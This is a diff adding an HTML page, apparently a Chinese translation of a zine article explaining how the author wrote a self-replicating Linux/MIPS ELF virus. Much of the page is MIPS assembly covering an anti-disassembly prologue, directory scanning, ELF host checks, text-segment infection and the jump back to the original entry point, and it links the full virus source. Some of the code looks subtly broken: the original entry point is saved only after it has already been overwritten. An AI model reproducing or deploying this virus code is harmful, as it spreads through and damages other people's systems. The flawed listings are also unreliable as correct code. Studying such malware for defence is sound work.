@@ -1,0 +1,346 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("../../gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                            ┌───────────────────────┐
+                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                            │ █   █ █ █ █   █       │
+                                                            │ █   █ █ █ █▀▀▀▀       │
+                                                            │ █   █   █ █     ▄     │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄   ▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                   █   │
+用MIPS汇编编写病毒的乐趣（无利可图）                             │                   █   │
+~ S01den                                                    └───────────────────█ ──┘
+
+由tmp.out团队的S01den倾情编写！
+2021年1月
+
++----------- 联系方式 -----------+
+| Twitter: @s01den               |
+| 邮箱: S01den@protonmail.com    |
++--------------------------------+
+
+.---\ 引言 /---.
+
+在这篇短文（？）中，我将向你解释我是如何用纯MIPS汇编编写Lin32.MIPS.Bakunin[0]的，这是我的
+第一个针对Linux/MIPS系统（如路由器、物联网设备或视频游戏主机）的病毒。显然，我没有也不会
+将它传播到野外。你也不要做这种愚蠢的事。
+
+我在这里使用了一些有趣的技巧，比如在启用PIE的情况下计算宿主程序的原始入口点，通过几个字节
+破坏对齐来混淆病毒的主要部分，以及更多惊喜！
+
+在开始之前，让我们总结一下Bakunin的基本特性：
+- 使用Silvio Cesare的文本感染方法[1]感染当前目录中的所有ELF文件，无论是否启用PIE
+  （修改文本段定义以使其能够容纳病毒代码）
+- 使用一种简单但强大的反逆向工程技术：假反汇编[2]
+- 打印"X_X"（如你所见，这是个非常棒的有效载荷）
+- 它是一位伟大的无政府主义哲学家 &lt;-- 不是这个Bakunin...
+
+现在你已经兴奋起来了，我们可以开始深入研究Lin32.MIPS.Bakunin的源代码了！
+警告：大量的MIPS代码。请保护好你的眼睛...
+
+.---\ 在MIPS汇编中实现假反汇编技术： /---.
+     \       编写序言部分            /
+
+在开始之前，我想简单解释一下什么是假反汇编。
+
+这种反RE技术很简单，就是通过硬编码指令的前几个字节（这里是前3个字节）来破坏对齐。
+这样，反汇编器会将这些"幽灵"字节解释为指令的开始，并用下一条指令的前几个字节来
+完成它。这将破坏所有的对齐，使许多指令看起来毫无意义。
+
+例如（不是来自我的病毒）：
+-------------------- cut-here --------------------
+
+                          jmp hey+2 # 跳过幽灵字节
+hey:                      hey:
+   xor %rbx, %rbx             .ascii "\x48\x31"
+   jmp yo            ====&gt;     xor %rbx, %rbx
+                               jmp yo
+---------------------------------------------------
+
+现在，如果我们查看这两段代码的反汇编结果，会看到这样的内容（使用radare2）：
+
+-------------------- cut-here --------------------
+;-- hey:
+0x00401002      4831db         xor rbx, rbx
+0x00401005      eb02           jmp 0x401009
+                          ||
+                          \/
+;-- hey:
+0x00401002      48314831       xor qword [rax + 0x31], rcx
+0x00401006      dbeb           fucomi st(3)
+0x00401008      026631         add ah, byte [rsi + 0x31]
+ ---------------------------------------------------
+
+这对MIPS架构来说非常强大，因为所有指令都由相同数量的字节（4字节）组成，所以指令的
+地址都对齐为4的倍数（以0x0、0x4、0x8或0xc结尾）。
+
+因此我们甚至不需要放置有意义的幽灵字节，可以放置任何我们想要的字节，因为对齐
+无论如何都会被破坏：
+
+0x004000b3                    unaligned
+0x004000b4      fc004003       invalid
+0x004000b8      a0182523       sb t8, 0x2523(zero)
+0x004000bc      bdf00003       cache 0x10, 3(t7)
+0x004000c0      a0202524       sb zero, 0x2524(at)
+0x004000c4      0500ff24       bltz t0, 0x3ffd58
+0x004000c8      02106b00       invalid
+0x004000cc      00000c03       sra at, zero, 0x10
+0x004000d0      a0202524       sb zero, 0x2524(at)
+0x004000d4      05000024       bltz t0, 0x400168
+                 ...
+
+如你所见，就是一堆垃圾 :)
+
+然而，在MIPS汇编中我们不能跳转到任意位置，我们必须跳转到4的倍数地址，因为对齐的
+要求。
+
+这就是为什么我将病毒分为两部分：序言和主体。
+
+序言部分包含一个mmap2系统调用，准备一个可执行的内存区域，我们将把主体代码（未对齐的）
+复制到这里（通过后面的.get_vx例程），然后才能跳转进去。换句话说，我们恢复对齐以便
+能够执行这些指令。
+
+--= 调用mmap2系统调用 =--
+  # 我不知道如何传递超过4个参数（寄存器$a0...$a3），
+  # 所以我写了一个简单的程序使用mmap()，静态链接它
+  # 并反汇编它以查看mmap是如何调用的，这就是我得到
+  # 以下3行代码的方式
+  sw  $zero,20($sp)
+  li  $v0,0
+  sw  $v0,16($sp)
+
+  li $a0, 0
+  li $a1, 0x6a8 # 病毒的完整大小
+  li $a2, 7    # PROT_READ|PROT_WRITE|PROT_EXEC
+  li $a3, 0x0802 # MAP_ANONYMOUS | MAP_PRIVATE
+  li $v0, 4210 # sys_mmap2
+  syscall
+------------------------------
+
+这相当于：
+
+ mmap2(NULL, 0x6a8, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+
+一旦我们分配了内存区域，我们就获取病毒主体的代码（在假反汇编字节之后）并将其复制进去。
+
+--= 复制病毒主体 =--
+  bgezal $zero, get_pc  # 我们通过直接访问指令的地址来获取代码
+  add $t1, $t1, 0x6f    # 0x6f = 到达主体的字节数，
+                        # 现在$t1包含主体的地址
+  move $t2, $v0         # $t2现在包含我们刚刚mmap的地址
+  li $t0, 0             # $t0将是我们的计数器
+
+  .get_vx:
+    lb $t3, 0($t1)      # 我们将当前获取的字节放入$t3
+    sb $t3, 0($t2)      # 并将这个字节写入$t2指向的区域
+    addi $t0, $t0, 1
+    addi $t1, $t1, 1
+    addi $t2, $t2, 1
+    blt $t0, 0x615, .get_vx # 主体中有0x615字节
+
+    jal $v0                 # 跳转到mmap的区域
+    beq $zero, $zero, eof   # 主体在执行有效载荷后会跳转到这里
+
+  get_pc: # 将保存的eip（或MIPS中的pc）移入$t1
+    move $t1, $ra
+    jr $ra
+---------------------------------
+
+注意：我们使用beq或bgezal这样的指令是因为我们必须在病毒中使用相对跳转（否则它们在
+被感染的二进制文件中无法工作），但经典的跳转指令（如j或jal）是绝对的...
+
+序言的结尾只包含一个sys_exit系统调用和一个填充，为9条指令留出空间（eof例程将在感染
+期间被重写为计算PIE下OEP的代码），以及.ascii "\xeb\x01\xe8"，这些幽灵字节破坏了
+主体代码的对齐。
+
+.---\ 感染整个目录：编写主体部分 /---.
+
+现在我们进入主体部分，可以做一些经典的病毒操作了。
+
+为了能够感染二进制文件，病毒必须获取当前目录中潜在宿主的列表。
+
+我们首先通过sys_getcwd系统调用获取当前目录的名称，然后通过sys_open系统调用打开它。
+
+一旦目录被打开，我们使用sys_getdents64系统调用获取一个包含目录中文件名的结构。
+
+我们用以下例程简单地解析它：
+
+--= 解析dirent结构 =--
+li $s0, 0 # s0将是我们的计数器
+parse_dir:
+  move $s2, $sp # s2将包含文件名的地址
+  addi $s2, $s2, 0x13 # d_name
+
+  li $t1, 0
+  addi $t1, $sp, 0x12
+  lb $t1, 0($t1) # t1现在包含条目的类型（文件或目录）
+
+  bgezal $zero, infect
+  li $t9, 0
+
+  # 获取d_reclen（参见dirent64结构的组织...）
+  addi $t9, $sp, 0x10
+  lb $t0, 1($t9)
+
+  # 缓冲区位置 += d_reclen
+  add $s0, $s0, $t0
+
+  add $sp, $sp, $t0
+
+  blt $s0, $s1, parse_dir # 如果计数器 &lt; 条目数：跳转到parse_dir
+------------------------------------
+
+然后，我们打开每个文件，并以这种方式mmap它们：
+mmap2(NULL, len_file, PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0)
+
+然后检查它们是否能够容纳病毒：
+
+--= 一些检查 =--
+# $s5包含mmap区域的地址
+
+.check_magic:
+  lw $t0, 0($s5)
+  li $t1, 0x7f454c46 # 通过检查魔数字节检查文件是否是ELF
+  bne $t0, $t1, end
+
+.check_bits:
+  lb $t0, 4($s5)
+  bne $t0, 1, end # 这里，我们检查e_ident[EI_CLASS]，以知道我们
+                  # 尝试感染的ELF是32位还是64位（如果是64位，跳转到end）
+
+.check_arch:
+  lb $t0, 18($s5)
+  li $t1, 8
+  bne $t0, $t1, end # 检查e_machine，以确保我们只感染MIPS二进制文件
+
+.check_infected:
+  lw $t0, 0x18($s5)
+  li $t1, 0x1000
+  bne $t0, $t1, end # 检查e_entry，如果它不是0x1000，说明文件已经被感染
+
+.check_type:
+  lh $t0, 0x10($s5)
+  li $t1, 2
+  bne $t0, $t1, end # 检查e_type，确保文件是可执行文件
+
+现在我们已经确认文件是一个有效的宿主，我们可以开始感染过程。我们使用Silvio Cesare的
+文本感染方法，它包括修改文本段的定义以使其能够容纳病毒代码。
+
+我们首先需要找到程序头表中的文本段：
+
+--= 定位文本段 =--
+  lw $t0, 0x1c($s5) # e_phoff
+  add $t0, $t0, $s5 # $t0 = 程序头表的地址
+
+  lw $t1, 0x2c($s5) # e_phnum
+  li $t2, 0 # 计数器
+
+.find_text:
+  lw $t3, 0($t0) # p_type
+  li $t4, 1
+  beq $t3, $t4, .found_text
+
+  addi $t0, $t0, 0x20 # sizeof(Elf32_Phdr)
+  addi $t2, $t2, 1
+  blt $t2, $t1, .find_text
+  b end
+
+.found_text:
+  # 保存一些我们稍后需要的值
+  lw $t3, 4($t0)  # p_offset
+  lw $t4, 8($t0)  # p_vaddr
+  lw $t5, 0x10($t0) # p_filesz
+  lw $t6, 0x14($t0) # p_memsz
+
+  # 修改段的大小以容纳病毒
+  li $t7, 0x6a8 # 病毒大小
+  add $t5, $t5, $t7
+  add $t6, $t6, $t7
+  sw $t5, 0x10($t0)
+  sw $t6, 0x14($t0)
+
+  # 修改入口点
+  sw $t4, 0x18($s5)
+
+  # 保存原始入口点
+  lw $t7, 0x18($s5)
+  sw $t7, 0x34($s5)
+
+现在我们已经修改了文本段，我们可以将病毒代码复制到文件末尾。但首先，我们需要
+生成返回原始入口点的代码。
+
+.---\ 在启用PIE的情况下返回原始入口点 /---.
+
+这是最有趣的部分。我们需要计算原始入口点的地址，即使在启用PIE的情况下。
+
+这是我的方法：
+
+1) 首先，我们需要获取当前指令的地址（在MIPS中是PC）。我们可以使用一个相对调用来
+   实现这一点：
+
+   bgezal $zero, get_pc
+   nop
+   get_pc:
+     move $t8, $ra
+
+2) 现在$t8包含了当前指令的地址。我们需要减去一些值以获得病毒代码的开始地址：
+
+   li $t9, 0x6a8 # 病毒大小
+   sub $t8, $t8, $t9
+
+3) 现在$t8包含了病毒代码在内存中的地址。我们需要减去文件中病毒代码的偏移量，
+   以获得加载基址：
+
+   lw $t9, 0x1c($s5) # e_phoff
+   add $t9, $t9, $s5 # $t9 = 程序头表的地址
+   lw $t7, 0($t9) # p_vaddr
+   sub $t8, $t8, $t7
+
+4) 最后，我们将这个基址加上原始入口点，就得到了正确的地址：
+
+   lw $t9, 0x34($s5) # 原始入口点
+   add $t8, $t8, $t9
+   jr $t8
+
+这就是全部了！我们的病毒现在可以在任何MIPS二进制文件中工作，无论是否启用PIE。
+
+.---\ 结论 /---.
+
+编写MIPS病毒是一个有趣的挑战。我学到了很多关于MIPS架构和ELF文件格式的知识。
+我希望这篇文章能帮助你理解一些有趣的技术，如假反汇编和在启用PIE的情况下返回
+原始入口点。
+
+记住：这只是为了教育目的。不要将这些技术用于恶意目的。
+
+--- 注释和参考文献 ---
+[0] https://github.com/vxunderground/MalwareSourceCode/blob/main/VXUG/Linux.MIPS.Bakunin.asm
+[1] "Unix Viruses" by Silvio Cesare
+[2] "The Art of Anti Reverse Engineering" by Peter Ferrie
+
+--- 源代码 ---
+
+- <a href="../Linux.MIPS.Bakunin.asm">Linux.MIPS.Bakunin.asm</a>
+</pre></div></center></body></html> 
